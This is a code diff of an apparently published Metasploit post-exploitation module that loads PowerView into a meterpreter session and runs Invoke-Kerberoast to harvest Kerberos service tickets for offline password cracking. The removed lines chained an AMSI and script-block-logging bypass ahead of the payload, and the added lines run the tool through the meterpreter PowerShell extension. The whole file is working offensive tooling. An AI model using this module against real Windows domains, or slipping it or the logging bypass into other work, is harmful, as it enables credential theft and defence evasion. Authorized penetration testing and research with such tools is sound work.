@@ -12,18 +12,17 @@ class MetasploitModule < Msf::Post
     super(update_info(
       info,
       'Name' => 'Kerberoast',
-      'Description' => %q(This module load in memory PowerView.ps1 and executes Invoke-Kerberoast.),
+      'Description' => %q(This module load into memory PowerView.ps1 and executes Invoke-Kerberoast.),
       'License' => MSF_LICENSE,
       'Author' => [
         'harmj0y', # Invoke-Kerberoast
         'phra' # MSF Module
       ],
-      'References' => [''],
+      'References' => ['https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1'],
       'Platform' => [ 'win' ],
       'Arch' => [ 'x86', 'x64' ],
       'SessionTypes' => [ 'meterpreter' ]
-    )
-  )
+    ))
 
     register_options(
       [
@@ -35,18 +34,29 @@ class MetasploitModule < Msf::Post
 
   def run
     if have_powershell?
-      print_good('PowerShell is installed.')
+      vprint_good('PowerShell is installed.')
     else
       print_error('PowerShell is not installed! STOPPING')
       return
     end
 
-    bypass_script = File.read(File.join(Msf::Config.data_directory, "post", "powershell", "Invoke-Bypass.ps1"))
-    bypass_script += "\r\nInvoke-BypassAMSI;Invoke-BypassScriptBlockLog;\r\n"
-    base_script = File.read(File.join(Msf::Config.data_directory, "post", "powershell", "PowerView.ps1"))
-    print_status("Executing: #{datastore['cmd']}")
-    ps_output = psh_exec("#{bypass_script}\r\n#{base_script}\r\n#{datastore['cmd']}")
-    print_good("Powershell Script executed")
-    print_good("#{ps_output}")
+    client.core.use "powershell"
+
+    print_status("Importing: PowerView")
+
+    opts = {
+      file: File.expand_path(File.join(Msf::Config.data_directory, "post", "powershell", "PowerView.ps1"))
+    }
+
+    client.powershell.import_file(opts)
+    print_good("Imported: PowerView")
+    print_status("Executing: #{datastore['CMD']}")
+
+    opts = {
+      code: datastore['CMD']
+    }
+
+    result = client.powershell.execute_string(opts)
+    print_good("Command execution completed:\n#{result}")
   end
 end
